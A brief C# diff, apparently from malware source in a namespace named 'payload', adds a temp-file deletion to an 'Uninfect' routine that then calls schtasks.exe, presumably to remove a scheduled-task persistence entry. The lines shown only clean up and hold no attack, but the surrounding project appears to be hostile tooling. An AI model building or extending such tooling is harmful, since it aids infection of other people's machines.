@@ -63,6 +63,7 @@ namespace payload
 
         public static void Uninfect()
         {
+            File.Delete(Path.GetTempPath() + "\\wello.tmp");
             Process.Start(new ProcessStartInfo()
             {
                 FileName = "schtasks.exe",
